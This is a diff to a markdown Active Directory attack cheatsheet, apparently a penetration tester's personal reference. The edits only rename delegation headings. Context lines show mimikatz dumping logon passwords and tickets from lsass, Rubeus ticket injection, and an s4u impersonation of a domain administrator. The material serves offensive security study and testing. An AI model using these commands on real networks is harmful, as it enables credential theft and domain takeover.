@@ -1,5 +1,6 @@
 ---
 title: 📝 AD CheatSheet
+tags: #cheatsheet
 ---
 This is my personal safe for arsenals. Feel free to refer and use at anytime. You can also refer to this [arsenals](arsenals) for any extra commands (`Ctrl+f` will definitely help)
 
@@ -105,8 +106,7 @@ mimikatz# sekurlsa::minidump <Path_to_file>\lsass.dmp
 mimikatz# sekurlsa::logonpasswords
 ```
 
-## Delegations
-## Unconstrained Delegation
+## Delegation: Unconstrained Delegation
 ### Printer Bug
 Using spooler service to authenticate between domain computers(that runs spooler svc). Attackers can monitor incoming tickets with `Rubeus`.
 
@@ -133,7 +133,7 @@ mimikatz# sekurlsa::tickets /export
 Rubeus.exe ptt /ticket:ticket.kirbi
 ```
 
-## Constrained Delegation
+## Delegation: Constrained Delegation
 ### s4u delegation
 This attack is possible if `msds-AllowedToDelegateTo` is set.
 * with rc4 hash in hand
@@ -153,7 +153,7 @@ Rubeus.exe tgtdeleg /nowrap
 Rubeus.exe s4u /user:attacker /ticket:<base64-blob> /impersonateuser:administrator /msdsspn:time/dc01 /altservice:cifs,http,host /domain:contoso.local /dc:dc01.contoso.local /ptt
 ```
 
-## Resource-Based Constrained Delegation
+## Delegation: Resource-Based Constrained Delegation
 This attack is possible if owned user/computer object has _GenericWrite_ or write privilege to user/computer object attributes. Since we have write privilege, we can write to _msds-allowedtoactonbehalfofotheridentity_ property. There are few requirements needed in order to perform this attack.
 | Name                                              | Value       |
 | ------------------------------------------------- | ----------- |
